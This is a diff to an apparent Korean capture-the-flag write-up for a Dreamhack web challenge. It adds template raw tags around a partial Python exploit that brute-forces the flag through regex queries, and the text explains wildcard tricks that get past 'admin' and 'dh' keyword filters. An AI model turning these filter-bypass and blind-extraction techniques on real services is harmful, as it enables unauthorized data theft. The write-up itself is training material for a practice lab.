@@ -560,6 +560,7 @@ type: object
 
 위 두가지와 와일드카드를 이용해서 익스코드를 완성했다.
 
+{% raw %}
 ```python
 import requests, string
 HOST = 'http://host1.dreamhack.games:16090'
@@ -575,6 +576,7 @@ for i in range(32):
 			break
 	print(f'FLAG: DH{{{flag}}}')
 ```
+{% endraw %}
 
 `ad.in`을 통해 `admin`의 필터링을 우회하였고, 플래그 값이 `DH`로 시작하는 것을 알기 때문에 `D.`을 통해 `dh` 필터링을 우회했다. 정규식을 통해 데이터를 한조각씩 전부 찾아냄으로써 플래그를 획득했다.
 
